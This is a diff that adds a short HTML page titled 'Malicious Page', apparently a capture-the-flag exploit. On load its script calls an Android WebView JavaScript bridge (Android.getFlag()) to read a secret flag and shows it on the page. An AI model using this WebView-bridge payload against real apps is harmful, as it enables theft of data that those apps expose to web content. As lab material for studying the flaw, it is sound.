@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+    <script type="text/javascript">
+        function stealFlag() {
+            try {
+                console.log("Attempting to call getFlag()")
+                var flag = Android.getFlag();
+                console.log(flag);
+
+                var flagElement = document.createElement("p");
+                flagElement.textContent = "Stolen flag: " + flag;
+                document.body.appendChild(flagElement);
+            } catch (e) {
+                alert("Failed to get flag: " + e.message);
+            }
+        }
+    </script>
+</head>
+<body onload="stealFlag()">
+<h1>Malicious Content</h1>
+</body>
+</html>
